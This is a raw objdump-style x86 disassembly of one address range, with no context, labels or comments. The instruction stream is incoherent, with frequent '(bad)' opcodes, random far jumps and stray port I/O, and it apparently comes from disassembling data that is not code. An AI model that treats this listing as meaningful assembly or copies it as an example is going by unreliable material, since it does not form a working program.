  4069e4:	rcr    BYTE PTR [esi-0xcf7fb7f],1
  4069ea:	and    al,0x14
  4069ec:	jmp    0x54f7:0xaf8359e7
  4069f3:	fisttp QWORD PTR [edx+0x21a938f9]
  4069f9:	pop    esi
  4069fa:	push   0xa772b98a
  4069ff:	loopne 0x406a30
  406a01:	mov    WORD PTR [edi-0x52645bfa],gs
  406a07:	add    BYTE PTR [ecx-0x358b422c],bl
  406a0d:	loop   0x406a2b
  406a0f:	fnsave [edx-0x10adcc60]
  406a15:	push   ds
  406a16:	sbb    DWORD PTR [esi+0xddd4408],edi
  406a1c:	(bad)  
  406a1d:	int    0x82
  406a1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a20:	cmp    BYTE PTR [eax],ah
  406a22:	je     0x4069ec
  406a24:	and    al,0x11
  406a26:	xchg   edi,eax
  406a27:	int    0x62
  406a29:	test   BYTE PTR [edi-0x55],ah
  406a2c:	call   ebp
  406a2e:	retf   
  406a2f:	stc    
  406a30:	ror    dl,0xda
  406a33:	mov    ch,0xd1
  406a35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a36:	nop
  406a37:	or     DWORD PTR [eax+eax*4-0x69],ecx
  406a3b:	and    BYTE PTR [edx-0x2716e5de],cl
  406a41:	mov    ebp,0xee400e3b
  406a46:	dec    ecx
  406a47:	lea    edx,[ebp-0x7c]
  406a4a:	or     ecx,ebx
  406a4c:	mov    DWORD PTR [ecx-0x4df879a7],esp
  406a52:	mov    gs,ebx
  406a54:	fwait
  406a55:	arpl   WORD PTR [eax*8-0x12b86b2d],bp
  406a5c:	xchg   esi,eax
  406a5d:	mov    edx,0xadd2e29d
  406a62:	mov    esp,0x2d722f20
  406a67:	retf   0xc3a9
  406a6a:	pop    eax
  406a6b:	jl     0x406a58
  406a6d:	mov    eax,ds:0xd2d495c4
  406a72:	mov    al,ds:0x5d571118
  406a77:	pop    ecx
  406a78:	lahf   
  406a79:	jmp    0xda63:0x3915099c
  406a80:	add    BYTE PTR [edx],dl
  406a82:	adc    ebp,DWORD PTR [ecx+0x7e97daf5]
  406a88:	in     al,0x57
  406a8a:	mov    ds,WORD PTR [edi+0x52]
  406a8d:	aas    
  406a8e:	and    eax,0x2cdaed33
  406a93:	pop    edx
  406a94:	scas   eax,DWORD PTR es:[edi]
  406a95:	(bad)
  406a98:	mov    ebx,0xf17877c4
  406a9d:	pop    ebp
  406a9e:	mov    bl,0x27
  406aa0:	cmp    DWORD PTR [esi+0x70],0xffffffd8
  406aa4:	mov    ah,0x74
  406aa6:	dec    esp
  406aa7:	jmp    0xcfce71a8
  406aac:	xor    ecx,0x30
  406aaf:	dec    esi
  406ab0:	jae    0x406a4f
  406ab2:	or     DWORD PTR ds:0x5ce50408,ebx
  406ab8:	int    0xd1
  406aba:	popf   
  406abb:	js     0x406b32
  406abd:	fnstenv [esi-0x1daf381c]
  406ac3:	in     al,0xe6
  406ac5:	xchg   edx,eax
  406ac6:	out    0xc1,al
  406ac8:	xor    edi,DWORD PTR [eax]
  406aca:	jge    0x406a80
  406acc:	jb     0x406aad
  406ace:	mov    bl,0x14
  406ad0:	pusha  
  406ad1:	leave  
  406ad2:	or     ebx,DWORD PTR [eax-0x4e]
  406ad5:	push   edx
  406ad6:	xor    DWORD PTR [ecx],ebp
  406ad8:	jmp    0x55caf14c
  406add:	daa    
  406ade:	xchg   al,ch
  406ae0:	and    edx,DWORD PTR [ecx-0x27]
  406ae3:	test   eax,0xd949a3a2
  406ae8:	mov    dh,0x49
  406aea:	outs   dx,BYTE PTR ds:[esi]
  406aeb:	add    esp,DWORD PTR [edi+esi*8]
  406aee:	cld    
  406aef:	fidiv  WORD PTR [edx]
  406af1:	mul    BYTE PTR [esi]
  406af3:	cli    
  406af4:	pop    edi
  406af5:	aaa    
  406af6:	retf   
  406af7:	loope  0x406b51
  406af9:	push   ebx
  406afa:	sbb    ax,0x3e10
  406afe:	push   ss
  406aff:	mov    ch,0x53
  406b01:	test   DWORD PTR [ebx-0x74],0x3f20a3aa
  406b08:	mov    ch,0x17
  406b0a:	lock pusha 
  406b0c:	and    BYTE PTR [eax-0x1b],al
  406b0f:	daa    
  406b10:	call   0xfa29:0x54cf3d2f
  406b17:	lods   eax,DWORD PTR ds:[esi]
  406b18:	enter  0x3987,0x5c
  406b1c:	aas    
  406b1d:	rcl    DWORD PTR [esi+0x6f776b85],1
  406b23:	ret    
  406b24:	jmp    0x5540:0xc316aa0f
  406b2b:	out    dx,eax
  406b2c:	mov    edx,DWORD PTR [ebp+0x1d6c5fc0]
  406b32:	mov    cl,0xf
  406b34:	add    al,0x86
  406b36:	aaa    
  406b37:	aas    
  406b38:	lock add ebx,DWORD PTR [edi]
  406b3b:	ret    
  406b3c:	jne    0x406af4
  406b3e:	mov    ah,0x28
  406b40:	xor    esi,edx
  406b42:	jmp    0x406ba3
  406b44:	add    ch,ch
  406b46:	ss mov edi,0xb66c8cf6
  406b4c:	and    eax,0x44d80469
  406b51:	scas   eax,DWORD PTR es:[edi]
  406b52:	xor    al,0x47
  406b54:	jo     0x406b86
  406b56:	push   0xb3526405
  406b5b:	fcmovnu st,st(2)
  406b5d:	mov    ds:0x54fd3fed,eax
  406b62:	ficomp DWORD PTR [esp+eiz*4+0x2b]
  406b66:	mov    cs,WORD PTR [eax]
  406b68:	js     0x406b71
  406b6a:	xchg   ecx,eax
  406b6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b6c:	dec    esp
  406b6d:	pop    esp
  406b6e:	outs   dx,BYTE PTR ds:[esi]
  406b6f:	dec    ebx
  406b70:	fninit 
  406b72:	jl     0x406b52
  406b74:	xchg   DWORD PTR [eax+edi*1],edx
  406b77:	and    eax,0x5c8d8b6
  406b7c:	or     al,0xd4
  406b7e:	dec    edx
  406b7f:	outs   dx,BYTE PTR ds:[esi]
  406b80:	adc    ecx,DWORD PTR [ecx]
  406b82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b83:	xor    DWORD PTR [ecx],edi
  406b85:	cld    
  406b86:	pop    esp
  406b87:	popf   
  406b88:	in     al,0x4f
  406b8a:	mov    cl,0x16
  406b8c:	xchg   bl,bh
  406b8e:	pop    esi
  406b8f:	iret   
  406b90:	out    0x8c,al
  406b92:	pop    DWORD PTR [ecx]
  406b94:	mov    ?,WORD PTR [eax]
  406b96:	mov    ch,0x16
  406b98:	or     edx,DWORD PTR [edx-0x65805c84]
  406b9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b9f:	and    eax,DWORD PTR [ecx+eiz*1-0x5322e782]
  406ba6:	mov    ebx,0x2cbc72d2
  406bab:	xor    edx,DWORD PTR [esi-0x6d]
  406bae:	das    
  406baf:	mov    esp,0xa931db57
  406bb4:	cld    
  406bb5:	loope  0x406bd6
  406bb7:	(bad)  
  406bb8:	dec    ecx
  406bb9:	cmp    al,0xb1
  406bbb:	addr16 std 
  406bbd:	test   al,0xb9
  406bbf:	imul   ecx,DWORD PTR [edx+0x2939552a],0xffffffb3
  406bc6:	jmp    0xa765:0xc3600d31
  406bcd:	mov    ch,0x77
  406bcf:	retw   0x2818
  406bd3:	(bad)  
  406bd4:	(bad)  
  406bd5:	adc    eax,0x1b4b6bb7
  406bda:	mov    al,ds:0xd111327b
  406bdf:	ret    
  406be0:	in     al,0xf5
  406be2:	adc    edi,DWORD PTR [edi-0x8]
  406be5:	or     al,0xbc
  406be7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406be9:	test   BYTE PTR [ebp+edi*8+0x70],ah
  406bed:	or     edi,esi
  406bef:	cmp    BYTE PTR [edx-0x8e30385],dh
  406bf5:	jbe    0x406bcb
  406bf7:	das    
  406bf8:	lds    eax,FWORD PTR [eax]
  406bfa:	out    0x7,eax
  406bfc:	add    DWORD PTR [ecx+0x32],esi
  406bff:	clc    
  406c00:	mov    cl,0x25
  406c02:	mov    ecx,0x7d0e99e3
  406c07:	sub    BYTE PTR [esi],0xfc
  406c0a:	dec    eax
  406c0b:	int3   
  406c0c:	int3   
  406c0d:	repnz push ds
  406c0f:	inc    esp
  406c10:	sar    BYTE PTR [ebx+0x6715f208],1
  406c16:	fnstcw WORD PTR [eax+0x7d]
  406c19:	push   ebx
  406c1a:	mov    eax,ds:0xc85cacdc
  406c1f:	dec    ebp
  406c20:	ins    BYTE PTR es:[edi],dx
  406c21:	aaa    
  406c22:	add    esp,edx
  406c24:	rcl    BYTE PTR [edx],1
  406c26:	test   cl,bh
  406c28:	scas   al,BYTE PTR es:[edi]
  406c29:	push   edx
  406c2a:	fiadd  DWORD PTR ds:0x7bbad4a8
  406c30:	(bad)  
  406c33:	mov    DWORD PTR [ebx+0x489beeaf],ebp
  406c39:	fdiv   QWORD PTR [ebp+0x1b]
  406c3c:	nop
  406c3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c3e:	addr16 sbb al,0x22
  406c41:	imul   edx,DWORD PTR [ebx+0x72],0x63952fc5
  406c48:	inc    ebx
  406c49:	mov    cl,ah
  406c4b:	or     edx,esi
  406c4d:	push   esp
  406c4e:	dec    esi
  406c4f:	mov    bl,0xd4
  406c51:	hlt    
  406c52:	jbe    0x406c9e
  406c54:	out    0xcf,al
  406c56:	xor    ecx,esp
  406c58:	fsub   st,st(7)
  406c5a:	mov    al,0x17
  406c5c:	or     eax,DWORD PTR [ecx+edi*1-0x6e]
  406c60:	test   al,0x15
  406c62:	mov    esp,0x76390038
  406c67:	mov    esp,0xddf88e93
  406c6c:	inc    edx
  406c6d:	mov    ds:0x3dd03893,al
  406c72:	ds jb  0x406c93
  406c75:	push   ss
  406c76:	lods   eax,DWORD PTR ds:[esi]
  406c77:	cs mov bp,0xcc9f
  406c7c:	ja     0x406c3b
  406c7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c7f:	ret    0x8546
  406c82:	mov    edi,0x6b00e021
  406c87:	aam    0xff
  406c89:	xchg   esp,eax
  406c8a:	int    0x1
  406c8c:	mov    edx,0xf3a11f7
  406c91:	xor    DWORD PTR [ebx-0xcfbd38d],ebx
  406c97:	push   ds
  406c98:	jns    0x406cad
  406c9a:	mov    dl,al
  406c9c:	and    eax,0xd18684ba
  406ca1:	arpl   WORD PTR [ebp+0x56980635],bx
  406ca7:	sar    bh,0x6f
  406caa:	add    al,0x9a
  406cac:	rcr    esi,cl
  406cae:	sbb    edi,ebp
  406cb0:	or     al,0x51
  406cb2:	out    0x66,eax
  406cb4:	inc    esi
  406cb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cb6:	adc    ch,BYTE PTR [ecx-0x2f095d6c]
  406cbc:	rcr    BYTE PTR ss:[eax-0x49],1
  406cc0:	cwde   
  406cc1:	mov    cs,WORD PTR [ebp+0x3340aa0a]
  406cc7:	xchg   ecx,eax
  406cc8:	sbb    eax,0xbf81b74c
  406ccd:	push   edi
  406cce:	xchg   esi,eax
  406ccf:	push   cs
  406cd0:	gs jne 0x406d1a
  406cd3:	retf   
  406cd4:	scas   eax,DWORD PTR es:[edi]
  406cd5:	add    al,0xae
  406cd7:	hlt    
  406cd8:	(bad)  
  406cda:	or     eax,0x1d0b9f4
  406cdf:	lahf   
  406ce0:	retf   0x6008
  406ce3:	xor    bl,al
  406ce5:	data16 cmp al,0xa2
  406ce8:	xchg   esp,eax
  406ce9:	push   ecx
  406cea:	push   esi
  406ceb:	mov    bh,0xde
  406ced:	iret   
  406cee:	sbb    ah,BYTE PTR [edx+eax*8-0x1b]
  406cf2:	jle    0x406d1b
  406cf4:	xchg   esp,eax
  406cf5:	pop    ecx
  406cf6:	aaa    
  406cf7:	(bad)  
  406cf9:	test   al,0xd2
  406cfb:	les    esp,FWORD PTR [eax+eiz*1+0x4f53400]
  406d02:	icebp  
  406d03:	jmp    0x5349:0x98410ab9
  406d0a:	push   ebx
  406d0b:	das    
  406d0c:	jns    0x406d21
  406d0e:	in     al,0x95
  406d10:	jnp    0x406d5b
  406d12:	cmp    eax,0x526a3fb2
  406d17:	test   DWORD PTR [ebx],edi
  406d19:	and    eax,edi
  406d1b:	cmp    al,0xb8
  406d1d:	or     DWORD PTR [edi+0x67],0x26
  406d21:	sahf   
  406d22:	out    dx,al
  406d23:	push   eax
  406d24:	mov    cl,0x81
  406d26:	cmp    ecx,DWORD PTR [eax+0x107c4695]
  406d2c:	iret   
  406d2d:	sub    BYTE PTR [ebx+0x4d],0x26
  406d31:	sub    ebx,ebx
  406d33:	scas   eax,DWORD PTR es:[edi]
  406d34:	fcmovb st,st(2)
  406d36:	mov    ds:0xf43a686e,eax
  406d3b:	fimul  DWORD PTR [eax]
  406d3d:	je     0x406d0b
  406d3f:	nop
  406d40:	(bad)  
  406d41:	sub    esi,DWORD PTR [ecx+0x194b3f03]
  406d47:	inc    BYTE PTR [edx-0x35b03061]
  406d4d:	test   BYTE PTR [ecx+0x1b],ch
  406d50:	js     0x406d64
  406d52:	xchg   ebx,eax
  406d53:	ins    BYTE PTR es:[edi],dx
  406d54:	ds dec ecx
  406d56:	inc    ecx
  406d57:	or     esp,esp
  406d59:	mov    ebx,0xf305856e
  406d5e:	mov    ds:0xc0d39248,al
  406d63:	cmp    BYTE PTR [esi],ah
  406d65:	add    ebx,DWORD PTR [ebx]
  406d67:	jnp    0x406db6
  406d69:	xor    ecx,DWORD PTR [ebx+0x66]
  406d6c:	cli    
  406d6d:	je     0x406d69
  406d6f:	mov    al,0xd8
  406d71:	mov    cs:0x7625483e,eax
  406d77:	inc    edx
  406d78:	jl     0x406d7b
  406d7a:	mov    ebp,0x80ad84a6
  406d7f:	mov    bl,0xc7
  406d81:	ins    BYTE PTR es:[edi],dx
  406d82:	add    DWORD PTR [ecx-0x16],esi
  406d85:	in     al,dx
  406d86:	push   cs
  406d87:	mov    ebx,0x5d2233a0
  406d8c:	data16 fwait
  406d8e:	adc    DWORD PTR [edx+0x615086e6],0xe61b25b9
  406d98:	test   al,0x31
  406d9a:	mov    ds:0x9cb77d81,eax
  406d9f:	xor    eax,0x705962e9
  406da4:	xchg   ebp,eax
  406da5:	xacquire xchg BYTE PTR [edi-0x3c],al
  406da9:	cli    
  406daa:	sub    DWORD PTR [edx+0x5329ca75],ebp
  406db0:	pop    ecx
  406db1:	mov    dl,0x16
  406db3:	enter  0x690e,0x3e
  406db7:	push   ecx
  406db8:	push   ebp
  406db9:	mov    ebx,0xbb4e3974
  406dbe:	cdq    
  406dbf:	xchg   esi,eax
  406dc0:	inc    esp
  406dc1:	mov    ds:0x4be445a,eax
  406dc6:	fbld   TBYTE PTR [ebx]
  406dc8:	cdq    
  406dc9:	add    DWORD PTR [edx],esp
  406dcb:	mov    bl,0x3a
  406dcd:	int    0xe4
  406dcf:	pop    ss
  406dd0:	xchg   esp,eax
  406dd1:	lock (bad) 
  406dd3:	mov    ds:0x35d5e9b,al
  406dd8:	mov    edx,0x755818f1
  406ddd:	iret   
  406dde:	or     edi,esi
  406de0:	sub    BYTE PTR ds:[edx+edi*4-0x6a751bb9],dl
  406de8:	adc    BYTE PTR [eax+0x8f4f29a],ch
  406dee:	jecxz  0x406d71
  406df0:	push   ebp
  406df1:	gs pushf 
  406df3:	xchg   ecx,eax
  406df4:	mov    dh,0x14
  406df6:	sbb    BYTE PTR [ecx+eax*2],0x9c
  406dfa:	add    DWORD PTR [edx],esp
  406dfc:	sbb    eax,0x2a9aa208
  406e01:	push   cs
  406e02:	add    ch,BYTE PTR [esi]
  406e04:	xchg   edi,eax
  406e05:	ret    0x411e
  406e08:	test   BYTE PTR [ecx],al
  406e0a:	jl     0x406e51
  406e0c:	sbb    esp,0x14e298b8
  406e12:	rol    edx,1
  406e14:	jbe    0x406e24
  406e16:	ret    0xa079
  406e19:	aam    0x3e
  406e1b:	adc    eax,0xa07056b2
  406e20:	test   DWORD PTR [edx-0x74],esp
  406e23:	pop    es
  406e24:	mov    ah,0xf
  406e26:	cdq    
  406e27:	sar    DWORD PTR [edi-0x1c6ed877],0x19
  406e2e:	dec    ecx
  406e2f:	jg     0x406e11
  406e31:	das    
  406e32:	xchg   edx,eax
  406e33:	push   ss
  406e34:	ja     0x406e60
  406e36:	pushf  
  406e37:	and    DWORD PTR [edi-0x1a],edx
  406e3a:	cs test al,0x8
  406e3d:	sahf   
  406e3e:	push   es
  406e3f:	add    eax,0x90cb08c0
  406e44:	daa    
  406e45:	adc    bh,BYTE PTR [edx+0x5a]
  406e48:	test   al,0x69
  406e4a:	shl    DWORD PTR [ecx+0x6c],0x78
  406e4e:	inc    ebx
  406e4f:	pop    ss
  406e50:	aam    0x2
  406e52:	popa   
  406e53:	pop    ds
  406e54:	jp     0x406eb2
  406e56:	int3   
  406e57:	sbb    eax,0xbadc219a
  406e5c:	mov    eax,ds:0xed05868c
  406e61:	jle    0x406ea0
  406e63:	add    edx,ebp
  406e65:	ds scas eax,DWORD PTR es:[edi]
  406e67:	xchg   DWORD PTR ds:0x16dde275,edi
  406e6d:	adc    al,0x46
  406e6f:	scas   al,BYTE PTR es:[edi]
  406e70:	rcl    BYTE PTR ss:[edi-0x47],0x37
  406e75:	jge    0x406ead
  406e77:	and    eax,0xd203921f
  406e7c:	xchg   esi,eax
  406e7d:	loopne 0x406e11
  406e7f:	mov    dh,dh
  406e81:	lods   al,BYTE PTR ds:[esi]
  406e82:	mov    esp,0x643cdda8
  406e87:	push   es
  406e88:	dec    esi
  406e89:	call   0x113f:0xd8ddae58
  406e90:	in     al,dx
  406e91:	ja     0x406e3e
  406e93:	xchg   ecx,eax
  406e94:	and    al,0x1d
  406e96:	loope  0x406ec5
  406e98:	lods   eax,DWORD PTR ds:[esi]
  406e99:	mov    ebx,0xfcb31e53
  406e9e:	test   al,0xdf
  406ea0:	shr    DWORD PTR [esi+ebx*1+0x43ee02e6],cl
  406ea7:	adc    ah,cl
  406ea9:	jmp    0xecbd9edb
  406eae:	sar    ecx,1
  406eb0:	out    0xdc,al
  406eb2:	ja     0x406e50
  406eb4:	in     eax,dx
  406eb5:	hlt    
  406eb6:	rcr    ah,0xe3
  406eb9:	je     0x406f01
  406ebb:	pusha  
  406ebc:	shl    eax,1
  406ebe:	adc    ebp,DWORD PTR [eax-0x7c96b918]
  406ec4:	sub    bh,BYTE PTR [eax-0x28fde795]
  406eca:	inc    edx
  406ecb:	imul   ebp,DWORD PTR [ebp+0x1693c979],0xcf9b5b3f
  406ed5:	in     eax,dx
  406ed6:	add    BYTE PTR [edx+0x77a74a6],0x79
  406edd:	pop    ss
  406ede:	stc    
  406edf:	jne    0x406e71
  406ee1:	push   0xfffffffa
  406ee3:	pop    ds
  406ee4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ee5:	dec    edx
  406ee6:	out    dx,eax
  406ee7:	gs loope 0x406ef2
  406eea:	jno    0x406f3a
  406eec:	lahf   
  406eed:	leave  
  406eee:	(bad)  
  406eef:	test   al,0x25
  406ef1:	mov    edi,0xe146139d
  406ef6:	mov    ebx,0x6b8e6962
  406efb:	aaa    
  406efc:	push   esi
  406efd:	ffreep st(6)
  406eff:	mov    al,ds:0x6aca9e2f
  406f04:	sti    
  406f05:	outs   dx,BYTE PTR ds:[esi]
  406f06:	mov    cl,al
  406f08:	push   ecx
  406f09:	pop    esi
  406f0a:	and    al,0x56
  406f0c:	xchg   esi,eax
  406f0d:	mov    bh,0x4
  406f0f:	mov    bl,0x50
  406f11:	outs   dx,DWORD PTR ds:[esi]
  406f12:	cmp    eax,0x5a2ee32f
  406f17:	sbb    al,0xea
  406f19:	mov    ecx,0xceb86a99
  406f1e:	fnstsw WORD PTR [ecx]
  406f20:	jge    0x406f82
  406f22:	push   0x6901acb8
  406f27:	mov    ebx,0x3c7c7abb
  406f2c:	repz adc eax,0x76fefc05
  406f32:	dec    esi
  406f33:	rol    dl,1
  406f35:	rcl    esi,cl
  406f37:	jmp    0x406ed7
  406f39:	jecxz  0x406f96
  406f3b:	test   DWORD PTR es:[edi+edx*1-0x18],ebp
  406f40:	push   ss
  406f41:	or     al,0xb7
  406f43:	repz mov edx,0x73c5623
  406f49:	xor    al,0x24
  406f4b:	test   al,0xfc
  406f4d:	in     eax,0x20
  406f4f:	lock dec edi
  406f51:	add    ebp,DWORD PTR [ecx+0x30]
  406f54:	rcr    BYTE PTR [edx+ecx*2],0x7b
  406f58:	bound  ecx,QWORD PTR [eax+0x2f8ffe75]
  406f5e:	stc    
  406f5f:	cdq    
  406f60:	into   
  406f61:	push   ebp
  406f62:	push   0xffffffd7
  406f64:	xchg   ebx,eax
  406f65:	test   eax,0x70e3acdd
  406f6a:	cmp    BYTE PTR [edx-0x28be3d9a],bl
  406f70:	push   ebp
  406f71:	arpl   WORD PTR [ebp+0x542a8c19],di
  406f77:	jg     0x406f6d
  406f79:	xor    edx,DWORD PTR [edi+0x53]
  406f7c:	and    edi,ecx
  406f7e:	rsqrtps xmm3,XMMWORD PTR [edx+0x380a2b72]
  406f85:	jno    0x406f12
  406f87:	add    BYTE PTR [ebx-0x710d591],bl
  406f8d:	sar    al,1
  406f8f:	rcr    al,1
  406f91:	ror    BYTE PTR [ecx-0x583e45d],0x8
  406f98:	daa    
  406f99:	(bad)  
  406f9a:	cli    
  406f9b:	lds    ecx,FWORD PTR [eax+0x4f4f2807]
  406fa1:	xlat   BYTE PTR ds:[ebx]
  406fa2:	nop
  406fa3:	aas    
  406fa4:	test   BYTE PTR [edx+edi*2],ch
  406fa7:	jp     0x406ffd
  406fa9:	push   ss
  406faa:	pop    ds
  406fab:	popf   
  406fac:	mov    al,ds:0x99d244c8
  406fb1:	jbe    0x406f6a
  406fb3:	fadd   DWORD PTR [ecx+0x65]
  406fb6:	mov    ch,0xb
  406fb8:	test   bl,cl
  406fba:	in     eax,dx
  406fbb:	mul    DWORD PTR [edi-0x7e3c9cb6]
  406fc1:	mov    edi,0xf01067a8
  406fc6:	mov    dl,0x50
  406fc8:	out    dx,eax
  406fc9:	int3   
  406fca:	pop    ebp
  406fcb:	(bad)  
  406fcd:	dec    esi
  406fce:	add    DWORD PTR [edx-0x15364a05],ebx
  406fd4:	push   ds
  406fd5:	loope  0x406fdd
  406fd7:	sti    
  406fd8:	out    0xcb,eax
  406fda:	bound  esi,QWORD PTR [eax]
  406fdc:	loope  0x406fb4
  406fde:	ja     0x406f7b
  406fe0:	and    eax,0x59b6f2af
  406fe5:	pop    ecx
  406fe6:	lock xchg ebx,eax
  406fe8:	clc    
  406fe9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fea:	xchg   edi,eax
  406feb:	xchg   ebx,eax
  406fec:	daa    
  406fed:	out    0x29,al
  406fef:	add    eax,0x1bef3550
  406ff4:	or     BYTE PTR [eax],0xc8
  406ff7:	fwait
  406ff8:	lock mov eax,0xe3116f38
  406ffe:	es in  eax,0xe5
  407001:	push   cs
  407002:	sti    
  407003:	sahf   
  407004:	test   al,0x93
  407006:	aas    
  407007:	in     al,0x27
  407009:	add    ecx,DWORD PTR [eax-0x27]
  40700c:	popa   
  40700d:	xchg   ebp,eax
  40700e:	pop    ebx
  40700f:	fimul  DWORD PTR [edx+0x255a206f]
  407015:	sar    BYTE PTR [esi+0x2ab0c7b5],cl
  40701b:	push   0x21
  40701d:	jle    0x40709d
  40701f:	push   edi
  407020:	and    eax,0xa47bb2cc
  407025:	adc    DWORD PTR [ebx+0x2b3b3b5],esi
  40702b:	xchg   DWORD PTR cs:[edi+0x7a1b63c5],edx
  407032:	(bad)  
  407033:	xlat   BYTE PTR ds:[ebx]
  407034:	pop    edx
  407035:	add    esi,DWORD PTR [edi+0x585549ba]
  40703b:	fadd   DWORD PTR [edi+0x10c14cb0]
  407041:	iret   
  407042:	fiadd  DWORD PTR [ebp-0x7]
  407045:	jae    0x40709d
  407047:	lods   al,BYTE PTR ds:[esi]
  407048:	jmp    0x406ff6
  40704a:	add    eax,0x59fd0215
  40704f:	jle    0x40709d
  407051:	loope  0x407035
  407053:	enter  0x4b09,0x61
  407057:	call   0x3c568f2b
  40705c:	mov    ds:0x1b78ee9f,eax
  407061:	scas   eax,DWORD PTR es:[edi]
  407062:	aaa    
  407063:	inc    eax
  407064:	mul    ah
  407066:	ret    0x3359
  407069:	adc    al,0x13
  40706b:	sbb    DWORD PTR [eax],edx
  40706d:	and    ecx,DWORD PTR [ecx]
  40706f:	cmp    eax,0x37bc0985
  407074:	jmp    0x4070de
  407076:	add    esp,DWORD PTR [ebx+0x2218eadf]
  40707c:	inc    esp
  40707d:	nop
  40707e:	and    bh,BYTE PTR [edx*2-0x21a99dd0]
  407085:	cmp    ah,dh
  407087:	in     eax,dx
  407088:	ret    
  407089:	xor    DWORD PTR [ecx],eax
  40708b:	out    0xd9,eax
  40708d:	dec    esi
  40708e:	pop    ebx
  40708f:	sahf   
  407090:	mov    dl,0xed
  407092:	cmp    al,0x35
  407094:	mov    ds:0x935d853a,al
  407099:	daa    
  40709a:	(bad)  
  40709c:	lea    edi,[eax]
  40709e:	cdq    
  40709f:	push   edi
  4070a0:	jmp    0x6a87:0x8f3e766d
  4070a7:	mov    bh,dh
  4070a9:	sti    
  4070aa:	add    esp,DWORD PTR [esi+0x2e]
  4070ad:	inc    ecx
  4070ae:	mov    ebp,0x11c984f7
  4070b3:	cmp    esp,DWORD PTR [edx+0x34d7eeeb]
  4070b9:	inc    ebp
  4070ba:	arpl   dx,dx
  4070bc:	fdivr  QWORD PTR [ebx]
  4070be:	lods   al,BYTE PTR ds:[esi]
  4070bf:	xor    DWORD PTR [ecx-0x166d0173],edi
  4070c5:	pop    edi
  4070c6:	std    
  4070c7:	adc    bh,dl
  4070c9:	cmp    BYTE PTR [edx+0x3e],al
  4070cc:	neg    esi
  4070ce:	jmp    0x1761:0xff441fde
  4070d5:	mov    ds:0x7738d12d,al
  4070da:	mov    al,0xb3
  4070dc:	aaa    
  4070dd:	fistp  WORD PTR [eax+0x78]
  4070e0:	ret    
  4070e1:	das    
  4070e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070e3:	std    
  4070e4:	jge    0x4070c5
  4070e6:	and    al,0x3d
  4070e8:	sub    bh,bl
  4070ea:	push   esi
  4070eb:	jns    0x407087
  4070ed:	scas   eax,DWORD PTR es:[edi]
  4070ee:	cli    
  4070ef:	and    ch,BYTE PTR [ecx+eax*8-0x51]
  4070f3:	fimul  DWORD PTR [ebx+0x3b]
  4070f6:	dec    ebp
  4070f7:	imul   esp,eax,0x54f63d85
  4070fd:	sub    DWORD PTR [esi],ecx
  4070ff:	mov    al,0x2
  407101:	or     BYTE PTR [esi],bh
  407103:	adc    al,0xd1
  407105:	dec    esi
  407106:	and    cl,bl
  407108:	or     bl,BYTE PTR [eax+0x4ffd0730]
  40710e:	call   0x98d11307
  407113:	add    dh,BYTE PTR [edi-0x1e3adb7e]
  407119:	jl     0x40715c
  40711b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40711c:	mov    dh,0xf8
  40711e:	inc    eax
  40711f:	mov    ebx,0x26564b80
  407124:	popf   
  407125:	aaa    
  407126:	xor    ebx,edx
  407128:	cmp    DWORD PTR [ebp-0xa5d161b],0x93f77d4f
  407132:	and    al,0x51
  407134:	iret   
  407135:	xchg   esi,eax
  407136:	mov    ebp,DWORD PTR [edi+0x2b]
  407139:	or     DWORD PTR [esi+0x1b552179],ecx
  40713f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407140:	fcmovnu st,st(1)
  407142:	jbe    0x407131
  407144:	add    ch,BYTE PTR [ecx+0x5c368ed2]
  40714a:	push   esi
  40714b:	xchg   BYTE PTR [edi],bh
  40714d:	jae    0x4070de
  40714f:	dec    edi
  407150:	sub    DWORD PTR [esi],edi
  407152:	push   ecx
  407153:	push   edx
  407154:	das    
  407155:	pop    ebx
  407156:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407157:	ins    BYTE PTR es:[edi],dx
  407158:	add    BYTE PTR [ebx],bh
  40715a:	pusha  
  40715b:	mov    edx,0x5407a216
  407160:	xchg   DWORD PTR [ebx-0x4c4057b1],ebp
  407166:	push   eax
  407167:	rcr    DWORD PTR [eax+0x7e280e93],cl
  40716d:	and    BYTE PTR [ecx-0x26],dh
  407170:	sub    al,BYTE PTR ds:0x83d8
  407175:	stos   DWORD PTR es:[edi],eax
  407176:	jo     0x4071b5
  407178:	xchg   edx,eax
  407179:	iret   
  40717a:	xor    eax,0x6d426f65
  40717f:	xor    eax,0x3fa28dde
  407184:	and    al,BYTE PTR [ebx+0x50]
  407187:	loop   0x407172
  407189:	cmp    al,0xfb
  40718b:	(bad)  
  40718c:	retf   0xfba5
  40718f:	push   0x2
  407191:	scas   eax,DWORD PTR es:[edi]
  407192:	jbe    0x40713c
  407194:	cs popa 
  407196:	fnsave [ecx+ebp*2+0x2]
  40719a:	stos   DWORD PTR es:[edi],eax
  40719b:	push   ss
  40719c:	pop    eax
  40719d:	int    0xa5
  40719f:	and    al,BYTE PTR [eax-0x56]
  4071a2:	nop
  4071a3:	cmp    cl,BYTE PTR [edi+0x5e]
  4071a6:	arpl   WORD PTR [edx],di
  4071a8:	sbb    eax,0xc6790e50
  4071ad:	jmp    0x40713b
  4071af:	dec    esi
  4071b0:	xchg   ebx,eax
  4071b1:	push   ss
  4071b2:	or     edi,eax
  4071b4:	mov    edx,0xf7b824dc
  4071b9:	add    ch,cl
  4071bb:	mov    esi,0x6a4553
  4071c0:	adc    DWORD PTR [ebx+edi*1-0x45128d7],ecx
  4071c7:	cmove  eax,DWORD PTR [edi+0x73]
  4071cb:	jmp    0xc2acf2bf
  4071d0:	lods   al,BYTE PTR ds:[esi]
  4071d1:	fidivr DWORD PTR [esp+ebx*2-0x2f]
